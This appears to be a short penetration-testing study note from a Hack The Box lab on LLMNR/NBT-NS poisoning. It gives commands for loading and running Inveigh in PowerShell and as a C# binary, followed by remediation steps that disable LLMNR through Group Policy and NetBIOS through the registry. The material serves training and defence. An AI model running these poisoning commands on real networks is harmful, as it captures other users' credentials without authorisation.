## Using Inveigh

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1 
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```

```powershell
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
![[Pasted image 20260525121229.png]]
## C# Inveigh (InveighZero)

```powershell
PS C:\htb> .\Inveigh.exe
```
![[Screenshot 2026-05-25 at 12.15.57.png]]
## Remediation

We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
![[Pasted image 20260525121906.png]]

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```
![[Pasted image 20260525122029.png]]
`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
![[Pasted image 20260525122113.png]]
